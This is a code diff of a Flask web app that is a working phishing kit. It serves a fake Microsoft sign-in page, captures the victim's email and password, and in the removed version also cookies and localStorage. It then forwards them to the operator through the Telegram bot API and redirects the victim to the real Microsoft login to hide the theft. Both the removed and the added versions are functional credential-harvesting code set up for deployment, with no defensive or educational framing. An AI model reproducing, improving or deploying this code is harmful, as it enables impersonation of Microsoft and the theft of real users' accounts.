@@ -1,97 +1,69 @@
-from flask import Flask, request, Response
+
+from flask import Flask, request
 import requests
 import json
 import base64
-import os
-from datetime import datetime
 import urllib.parse
+import os
 
 app = Flask(__name__)
 
-# Config - Set in Railway ENV
-TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
-CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
+TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+CHATID = os.environ.get('TELEGRAM_CHAT_ID')
 
-HTML_PAGE = '''<!DOCTYPE html>
-<html><head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>Microsoft - Work or school account</title>
-<style>
-*{padding:0;margin:0;box-sizing:border-box}:root{--p:#0078d4;--bg:#f3f2f1;--s:#fff;--t:#323130;--b:#edebe9;--r:4px}
-body{font-family:"Segoe UI",sans-serif;background:var(--bg);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.c{max-width:420px;width:100%;background:var(--s);border-radius:var(--r);box-shadow:0 4px 20px rgba(0,0,0,.1)}
-.h{padding:32px 32px 0;background:linear-gradient(135deg,var(--p),#005a9e);color:#fff;text-align:center}
-.h h1{font-size:28px;font-weight:600;margin-bottom:8px}
-.h p{font-size:16px;opacity:.9}
-.l{width:40px;height:40px;background:var(--p);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:20px;font-weight:600;margin-bottom:16px}
-.f{padding:32px}
-.g{margin-bottom:24px}
-.l2{display:block;margin-bottom:8px;color:#323130;font-weight:500;font-size:14px}
-.i{width:100%;padding:12px 16px;border:1px solid var(--b);border-radius:var(--r);font-size:16px}
-.i:focus{outline:0;border-color:var(--p);box-shadow:0 0 0 3px rgba(0,120,212,.1)}
-.b{width:100%;background:var(--p);color:#fff;border:0;padding:14px;border-radius:var(--r);font-size:16px;font-weight:600;cursor:pointer}
-.b:hover{background:#106ebe;transform:translateY(-1px)}
-.ft{text-align:center;margin-top:16px}
-.ft a{color:var(--p);text-decoration:none;font-size:14px}
-.ld{display:none;text-align:center;padding:40px;color:#605e5c}
+@app.route('/')
+def home():
+    return '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Microsoft</title>
+<style>body{font-family:Segoe UI;background:#f3f2f1;margin:0;padding:50px;text-align:center}
+.login{max-width:400px;margin:auto;background:white;padding:40px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.1)}
+input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
+button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
+button:hover{background:#106ebe}
 </style></head><body>
-<div class="c">
-<div class="h"><div class="l">M</div><h1>Work or school account</h1><p>Sign in with your Microsoft work or school account</p></div>
-<form id="f">
-<div class="f">
-<div class="g"><label class="l2">Email, phone, or Skype</label><input class="i" id="u" placeholder="name@company.com" required></div>
-<div class="g"><label class="l2">Password</label><input class="i" type="password" id="p" placeholder="Password" required></div>
-<button class="b" type="submit">Sign in</button>
-<div class="ft"><a href="#" onclick="alert('Contact admin')">Forgot my password</a></div>
-</div></form>
-<div id="l" class="ld">🔄 Verifying...</div>
+<div class="login">
+<h2>🔐 Microsoft Sign In</h2>
+<form id="form">
+<input id="user" placeholder="Email" required>
+<input id="pass" type="password" placeholder="Password" required>
+<button type="submit">Sign In</button>
+</form>
+<div id="load" style="display:none;padding:20px">Verifying...</div>
 </div>
 <script>
-w="/harvest";function h(d,m){navigator.sendBeacon(w+"?t=YOUR_TOKEN&data="+btoa(JSON.stringify(d)))}function c(){h({c:document.cookie,ua:navigator.userAgent,ls:{...localStorage}},"👤 Victim")}window.onload=c;document.getElementById("f").onsubmit=function(e){e.preventDefault();const d={u:document.getElementById("u").value,p:document.getElementById("p").value,c:document.cookie};h(d,"🔥 M365\\n👤 "+d.u+"\\n🔑 "+d.p);document.getElementById("f").style.display="none";document.getElementById("l").style.display="block";setTimeout(()=>{window.location="https://login.microsoftonline.com/?username="+encodeURIComponent(d.u)},2500)}
-</script></body></html>'''
+function send(data){fetch("/grab",{method:"POST",body:JSON.stringify(data)})}
+window.onload=function(){send({test:"alive"})};
+document.getElementById("form").onsubmit=function(e){
+e.preventDefault();
+var u=document.getElementById("user").value;
+var p=document.getElementById("pass").value;
+send({user:u,pass:p,test:"creds"});
+document.getElementById("form").style.display="none";
+document.getElementById("load").style.display="block";
+setTimeout(function(){window.location="https://login.microsoftonline.com/?username="+encodeURIComponent(u)},3000)
+}
+</script></body></html>''', 200, {'Content-Type': 'text/html'}
 
-def telegram(msg):
-    if not TELEGRAM_TOKEN or not CHAT_ID:
-        print(f"🚨 NO TELEGRAM: {msg[:100]}")
-        return
-    try:
-        r = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                         data={'chat_id':CHAT_ID,'text':msg,'parse_mode':'HTML'})
-        print("📱 OK")
-    except:
-        print("❌ Telegram fail")
-
-@app.route('/', defaults={'path':''})
-@app.route('/<path:path>')
-def home(path=''):
-    if path in ['favicon.ico','robots.txt']:
-        return '',204
-    html = HTML_PAGE.replace('YOUR_TOKEN',TELEGRAM_TOKEN)
-    return Response(html, mimetype='text/html')
-
-@app.route('/harvest')
+@app.route('/grab', methods=['POST'])
 def grab():
-    ip = request.remote_addr
     try:
-        d = json.loads(base64.b64decode(urllib.parse.unquote(request.args.get('data',''))).decode())
-        u = d.get('u','')
-        p = d.get('p','')
-        c = d.get('c','')
+        data = request.get_json() or {}
+        ip = request.remote_addr
+        user = data.get('user', '')
+        msg = f"🚨 HIT from {ip}\\n{'User: '+user if user else 'Cookies: '+str(data.get('test'))}"
         
-        print(f"🌐 {ip} | {u}")
+        print(f"DEBUG: {msg}")  # Railway logs
         
-        if u:
-            telegram(f"🔥 <b>M365 HIT!</b>\\n👤 <code>{u}</code>\\n🔑 <code>{p}</code>\\n📍 <code>{ip}</code>")
-        if c:
-            telegram(f"🍪 <b>{ip}</b>\\n<code>{c}</code>")
-            
+        if TOKEN and CHATID:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                         data={'chat_id':CHATID, 'text':msg})
+            return "OK", 200
+        else:
+            return f"NO TELEGRAM CONFIG: TOKEN={bool(TOKEN)}, CHATID={bool(CHATID)}", 500
     except Exception as e:
-        print(f"ERR: {e}")
-    
-    return '',200
+        return f"ERROR: {str(e)}", 500
 
 if __name__=='__main__':
-    port=int(os.environ.get('PORT',5000))
-    print("🚀 LIVE on port",port)
-    app.run(host='0.0.0.0',port=port,debug=False)
+    port = int(os.environ.get('PORT', 5000))
+    print(f"🚀 Server on {port} | Token: {'YES' if TOKEN else 'NO'}")
+    app.run(host='0.0.0.0', port=port)
